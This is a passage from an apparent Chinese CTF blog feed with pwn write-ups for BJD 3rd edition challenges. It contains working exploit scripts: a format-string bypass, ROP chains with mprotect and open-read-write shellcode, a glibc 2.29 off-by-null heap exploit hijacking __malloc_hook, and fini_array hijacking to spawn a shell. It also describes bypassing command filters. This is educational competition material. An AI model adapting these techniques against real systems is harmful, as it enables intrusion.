class="line"></span><br><span class="line">start(sys.argv[<span class="number">1</span>], <span class="string">'123'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    choose(<span class="string">'[RPC]'</span>, <span class="number">4</span>)</span><br><span class="line">    say(<span class="number">0x18</span>, <span class="string">'test'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/212563&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/212563&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;两天摸了三个pwn，剩下的cfgo-LuckyMaze，IDA反编译出来的代码实在太难看了，水平有限；baby_mac确实有相关的分析文章，无奈没有环境只能放弃。剩下三个好好总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>第三届 BJD: pwn</title>
    <link href="https://n0nop.github.io/2020/05/24/%E7%AC%AC%E4%B8%89%E5%B1%8A-BJD-pwn/"/>
    <id>https://n0nop.github.io/2020/05/24/%E7%AC%AC%E4%B8%89%E5%B1%8A-BJD-pwn/</id>
    <published>2020-05-23T16:03:18.000Z</published>
    <updated>2020-05-25T00:58:41.666Z</updated>
    
    <content type="html"><![CDATA[<p>嘴上说不能再打了，一堆事情没做，身体却很诚实。主要是奔着pwn来的，也没想着要冲榜啥的，纯当练习了。<br>OJ1的本地和远程环境的不一致让我与AK失之交臂，还是赛后问出题的师傅才发现思路是对的（难顶，我的本地感觉有毒，无数次死在本地环境上）。简单记录一下， 没有写的很详细。</p><a id="more"></a><h1 id="OJ0"><a href="#OJ0" class="headerlink" title="OJ0"></a>OJ0</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做出来的人应该蛮多的，简单说一下思路：</p><ol><li>过滤了一些如”system”, “execve”的命令，过滤了”/bin”，只能想办法读flag</li><li>过滤了”flag”，”home”字符串，可以多种方法绕过，用”gets”读文件名，或者分开写都行</li><li>开始没注意可以得到提示，也就是flag的路径，所以用`opendir”和”readdir”读了下目录（多余了）</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>没存，随便写都行。</p><h1 id="OJ1"><a href="#OJ1" class="headerlink" title="OJ1"></a>OJ1</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>有点难受，我的<code>main</code>可以在<code>.rodata</code>，可以在<code>.data</code>，可以<code>.bss</code>上，就是不能在<code>.text</code>上，难顶。</p><ol><li>过滤各种括号，用OJ0扒了一下源码，逻辑应该差不多，看了检查的逻辑，应该是绕不过</li><li>尝试中发现<code>int main = xxxx;</code>可以通过编译，调试一下发现<code>main</code>的代码是可以通过赋值控制的（但是我本地没法执行）。</li><li>那只要<code>char main = x; char a0 = x; char a1 = x; ...</code>布置shellcode就好了。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>没exp，当时没做出来。</p><h1 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>在midnight ctf 2020 pwn4的基础上改的，主要的点就在这个fsb怎么绕过key的判断。</p><ol><li>用fsb绕过key的比较</li><li><code>read</code>一段orw的shellcode到bss上</li><li>调用<code>mprotect</code>修改bss为可执行段</li><li>跳到bss的shellcode上执行</li><li>这里我用orw是因为远程开shell打不通，加上本来fsb就要挺久时间，orw显然更稳一点</li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">system_plt = <span class="number">0x0000000000401114</span></span><br><span class="line">read_plt = <span class="number">0x0000000000401140</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">open_plt = <span class="number">0x401180</span></span><br><span class="line">fprintf_got = <span class="number">0x404040</span></span><br><span class="line">mprotect_got = <span class="number">0x404050</span></span><br><span class="line"></span><br><span class="line">fst = <span class="number">0x00000000004020AA</span></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x000000000040172d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401733</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401731</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x0000000000401710</span></span><br><span class="line">gadget_2 = <span class="number">0x0000000000401726</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401710 loc_401710:                             ; CODE XREF: init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000401710                 mov     rdx, r14</span></span><br><span class="line"><span class="string">.text:0000000000401713                 mov     rsi, r13</span></span><br><span class="line"><span class="string">.text:0000000000401716                 mov     edi, r12d</span></span><br><span class="line"><span class="string">.text:0000000000401719                 call    qword ptr [r15+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040171D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000401721                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000401724                 jnz     short loc_401710</span></span><br><span class="line"><span class="string">.text:0000000000401726</span></span><br><span class="line"><span class="string">.text:0000000000401726 loc_401726:                             ; CODE XREF: init+35↑j</span></span><br><span class="line"><span class="string">.text:0000000000401726                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040172A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040172B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040172C                 pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040172E                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000401730                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000401732                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000401734                 retn</span></span><br><span class="line"><span class="string">.text:0000000000401734 ; &#125; // starts at 4016D0</span></span><br><span class="line"><span class="string">.text:0000000000401734 init            endp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%6$*18$d%5$n"</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">"123"</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x118</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, elf.bss(<span class="number">0x600</span>), <span class="number">0x200</span>, read_got])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsp, elf.bss(<span class="number">0x600</span>)])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">"message: "</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x18</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, elf.bss(<span class="number">0</span>) - <span class="number">0xA0</span>, <span class="number">0x1000</span>, <span class="number">7</span>, mprotect_got])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([elf.bss(<span class="number">0x6A0</span>)])</span><br><span class="line">orw = shellcraft.open(<span class="string">"flag"</span>)</span><br><span class="line">orw += shellcraft.read(<span class="string">"rax"</span>, elf.bss(<span class="number">0x800</span>), <span class="number">0x50</span>)</span><br><span class="line">orw += shellcraft.write(<span class="number">1</span>, elf.bss(<span class="number">0x800</span>), <span class="number">0x50</span>)</span><br><span class="line">payload += asm(orw)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="happyending"><a href="#happyending" class="headerlink" title="happyending"></a>happyending</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>刚开始本来就是想看看这道题的，因为发现是glibc2.29的off by null，没有学过，所以借机会学一下，能搜到相关的文章，所以就直接贴其他师傅的博客了（有时间再补充一下，感觉自己写博客印象会深刻一点，而且自己当时也调试了蛮久的）</p><ol><li><a href="http://blog.eonew.cn/archives/1233" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1233</a></li><li><a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257901.htm</a></li></ol><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>贴个exp仅供参考，感觉写得挺烂的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your blessing words length :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Best wishes to them!"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the idx to clean the debuff :"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the idx to show your blessing :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x1e4c40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># gap</span></span><br><span class="line">        <span class="comment"># add(0x16DA8, '0')</span></span><br><span class="line">        add(<span class="number">0x7DA8</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin list</span></span><br><span class="line">        add(<span class="number">0x510</span>, <span class="string">'1'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'2'</span>)</span><br><span class="line">        add(<span class="number">0x580</span>, <span class="string">'3'</span>)</span><br><span class="line">        <span class="comment"># add(0x518, '4')</span></span><br><span class="line">        add(<span class="number">0xF518</span>, <span class="string">'4'</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># large bin with address like 0xXXXXXXXXX0XX</span></span><br><span class="line">        add(<span class="number">0x1000</span>, <span class="string">'5'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'6'</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x1100</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># victim chunk, bruteforce 4 bit</span></span><br><span class="line">        add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>) + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># prepare a fastbin and a fake victim-&gt;fd chunk</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">'8'</span>)</span><br><span class="line">        add(<span class="number">0xF8</span>, <span class="string">'9'</span>)</span><br><span class="line">        add(<span class="number">0x4F8</span>, <span class="string">'10'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fill tcache</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x28</span>, str(<span class="number">11</span> + i))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            delete(<span class="number">17</span> - i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get unsorted bin list</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        delete(<span class="number">10</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># victim-&gt;fd-&gt;bk = victim</span></span><br><span class="line">        add(<span class="number">0x510</span>, <span class="string">'1'</span> * <span class="number">8</span> + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># put to fastbin</span></span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># tcache </span></span><br><span class="line">        delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get all tcache</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x28</span>, <span class="string">"target"</span> + str(i))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fetch the victim chunk</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0x4F8</span>, <span class="string">'14'</span>)</span><br><span class="line">        add(<span class="number">0xF8</span>, p64(<span class="number">0xdead</span>) * <span class="number">30</span> + p64(<span class="number">0x150</span>))</span><br><span class="line">        delete(<span class="number">14</span>) </span><br><span class="line"></span><br><span class="line">        <span class="comment"># put int tcache</span></span><br><span class="line">        delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak libc</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"haha"</span>)</span><br><span class="line">        add(<span class="number">0x588</span>, <span class="string">'useup'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'start'</span>)</span><br><span class="line">        show(<span class="number">14</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">        libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        libc_realloc = libc_base + realloc_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10106</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook __realloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x101</span>) + p64(__malloc_hook - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0xF8</span>, p64(one_gadget) + p64(libc_realloc + <span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your blessing words length :"</span>, str(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory_Monster_I"></a>Memory_Monster_I</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>直接打<code>__stack_chk_fail</code>为预留的后门函数地址，然后利用栈溢出触发后门函数getshell。</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x404028</span>) + <span class="string">"A"</span> * <span class="number">0x50</span></span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0x40124A</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory_Monster_II"></a>Memory_Monster_II</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>跟pwnable.tw上的3x17一毛一样，因为直接改的3x17的脚本，这里就不赘述了，一搜一堆wp分析。<br><br>这里要改脚本是因为打不通，知识浅薄，原理尚不明确。特征在于好像”/bin/sh”的地址得用binary上面的，如果用自己布置在bss上的”/bin/sh”会假死（不过其实binary有现成的”/bin/sh”，自己布置也多此一举了)。<br><br>至于掉<code>execve</code>啥的，因为是静态编译，gadget一堆，所以随便写了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x402514</span></span><br><span class="line">pop_rsp = <span class="number">0x402ef9</span> <span class="comment"># pop rsp; ret;</span></span><br><span class="line">pop_rdi = <span class="number">0x401746</span> <span class="comment"># pop rdi; ret;</span></span><br><span class="line">pop_rsi = <span class="number">0x4036fe</span> <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdx = <span class="number">0x448415</span> <span class="comment"># pop rdx; ret;</span></span><br><span class="line">pop_rax = <span class="number">0x448fcc</span> <span class="comment"># pop rax; ret;</span></span><br><span class="line">leave = <span class="number">0x401CF3</span> <span class="comment"># leave; ret;</span></span><br><span class="line">fini_array_0 = <span class="number">0x4B80B0</span></span><br><span class="line">fini_array_1 = <span class="number">0x4B80B8</span></span><br><span class="line">bss = <span class="number">0x00000000004BF300</span> <span class="comment"># bss + 0x300</span></span><br><span class="line">main = <span class="number">0x401C1D</span></span><br><span class="line">__libc_csu_fini = <span class="number">0x402CB0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line"><span class="comment"># _start ==&gt; __libc_start_main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; init_array[0]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_init  --&gt; ...</span></span><br><span class="line"><span class="comment">#                  |                      \--&gt; init_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; fini_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_fini  --&gt; ...</span></span><br><span class="line"><span class="comment">#                                         \--&gt; fini_array[0]</span></span><br><span class="line"><span class="comment">###############################################################</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; __libc_csu_fini</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; main</span></span><br><span class="line"><span class="comment"># thus the program will execute as:</span></span><br><span class="line"><span class="comment"># main -&gt; __libc_csu_fini -&gt; main(fini_array_1) -&gt; libc_csu_fini(fini_array_0)</span></span><br><span class="line"><span class="comment">#                               ^                              |</span></span><br><span class="line"><span class="comment">#                               |                              |                       </span></span><br><span class="line"><span class="comment">#                               +------------------------------+</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(__libc_csu_fini) + p64(main)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put data on bss (later will be set as fake stack)</span></span><br><span class="line">payload = p64(bss + <span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0x492895</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x20</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x401D00</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since at this moment rbp == fini_array_0</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; leave</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; pop_rsp</span></span><br><span class="line"><span class="comment">#     fini_array_1 + 8 ==&gt; bss</span></span><br><span class="line"><span class="comment"># migrate stack to bss</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(leave) + p64(pop_rsp)</span><br><span class="line">payload += p64(bss + <span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory_Monster_III"></a>Memory_Monster_III</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>利用方法和上面一样，只不过没有现成的”/bin/sh”和<code>execve</code>可用，自己布置就行。</p><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 